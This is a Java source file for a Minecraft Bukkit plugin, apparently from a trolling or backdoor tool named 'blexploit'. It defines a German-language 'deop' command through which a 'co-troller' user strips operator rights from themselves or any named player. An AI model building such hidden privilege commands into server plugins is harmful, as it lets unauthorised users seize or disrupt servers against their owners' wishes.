package de.blexploit.command.cmds;

import org.bukkit.entity.Player;

import api.Fehler;
import de.blexploit.command.Command;
import de.blexploit.manager.TabManager;
import de.blexploit.players.create.MittrollerEntity;

public final class Deop extends Command {

	public Deop() {
		super("deop", "Nimmt einen Spieler die Operator Rolle weg", TabManager.INSERT_PLAYERNAME, null);
	}

	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length == 1) {
			mt.getPlayer().setOp(false);
			mt.sendMessage("Du hast nun keine Rechte mehr!");
		} else if (args.length == 2) {
			Player vic = api.Get.player(args[1]);
			if (vic == null) {
				mt.fehler(Fehler.PLAYER_NOT_FOUND);
				return;
			}

			vic.setOp(false);
			this.SpielerInfo(mt, "hat §c" + vic.getName() + this.CHAT_COLOR + " deopt!");
		} else {
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
		}
	}

}
